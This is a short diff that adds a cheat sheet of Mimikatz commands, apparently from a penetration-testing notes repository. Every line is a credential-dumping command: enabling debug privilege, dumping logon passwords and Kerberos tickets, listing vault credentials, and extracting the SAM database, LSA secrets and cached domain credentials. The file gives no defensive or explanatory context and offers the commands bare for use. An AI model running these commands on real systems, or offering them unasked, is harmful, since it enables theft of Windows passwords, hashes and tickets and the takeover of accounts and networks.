@@ -1,0 +1,13 @@
+# Mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+kerberos::list /export
+
+vault::cred
+vault::list
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
